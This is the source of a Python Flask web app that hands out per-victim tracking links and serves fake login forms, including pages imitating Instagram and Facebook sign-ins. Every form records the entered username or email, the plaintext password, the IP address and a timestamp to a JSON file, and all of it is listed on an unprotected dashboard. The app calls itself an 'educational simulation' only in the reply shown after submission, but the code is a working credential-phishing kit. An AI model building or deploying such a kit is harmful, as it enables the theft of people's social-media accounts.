from flask import Flask, render_template, request, redirect, url_for, flash
import uuid
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Needed for flash messages
DATA_FILE = "data.json"

def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

@app.route("/generate", methods=["GET"])
def generate():
    data = load_data()
    pid = str(uuid.uuid4())[:8]
    data[pid] = []  # initialize empty log
    save_data(data)
    full_url = url_for("login", pid=pid, _external=True)
    return render_template("generate.html", url=full_url)

@app.route("/login/<pid>", methods=["GET", "POST"])
def login(pid):
    data = load_data()
    if pid not in data:
        return "Invalid link", 404

    if request.method == "POST":
        action = request.form.get("action")
        if action == "login":
            entry = {
                "username": request.form.get("username"),
                "password": request.form.get("password"),
                "ip": request.remote_addr,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "id": pid
            }
            data[pid].append(entry)
            save_data(data)
            return "<h3>Thanks for logging in. This is an educational simulation.</h3>"
        elif action == "instagram":
            return "<h3>Redirecting to Instagram login... (simulated)</h3>"
        elif action == "facebook":
            return "<h3>Redirecting to Facebook login... (simulated)</h3>"
        elif action == "skip":
            return "<h3>Skipped login. This is an educational simulation.</h3>"
        else:
            flash("Invalid action.")
            return redirect(request.url)

    return render_template("login.html")

@app.route("/dashboard")
def dashboard():
    data = load_data()
    all_entries = []
    for pid, entries in data.items():
        for entry in entries:
            all_entries.append(entry)
    return render_template("dashboard.html", entries=all_entries)

@app.route("/skips_connect", methods=["GET", "POST"])
def skips_connect():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        if not email or not password:
            return "Email and password are required", 400
        data = load_data()
        pid = "skips_connect"
        if pid not in data:
            data[pid] = []
        entry = {
            "email": email,
            "password": password,
            "ip": request.remote_addr,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "id": pid
        }
        data[pid].append(entry)
        save_data(data)
        return redirect(url_for("dashboard"))
    return render_template("skips_connect.html")

@app.route("/instagram_connect", methods=["GET", "POST"])
def instagram_connect():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if not username or not password:
            return "Username and password are required", 400
        data = load_data()
        pid = "instagram_connect"
        if pid not in data:
            data[pid] = []
        entry = {
            "username": username,
            "password": password,
            "ip": request.remote_addr,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "id": pid
        }
        data[pid].append(entry)
        save_data(data)
        return redirect(url_for("dashboard"))
    return render_template("instagram_connect.html")

@app.route("/facebook_connect", methods=["GET", "POST"])
def facebook_connect():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        if not email or not password:
            return "Email and password are required", 400
        data = load_data()
        pid = "facebook_connect"
        if pid not in data:
            data[pid] = []
        entry = {
            "email": email,
            "password": password,
            "ip": request.remote_addr,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "id": pid
        }
        data[pid].append(entry)
        save_data(data)
        return redirect(url_for("dashboard"))
    return render_template("facebook_connect.html")

@app.route("/")
def home():
    return redirect(url_for("generate"))

if __name__ == "__main__":
    app.run(debug=True)

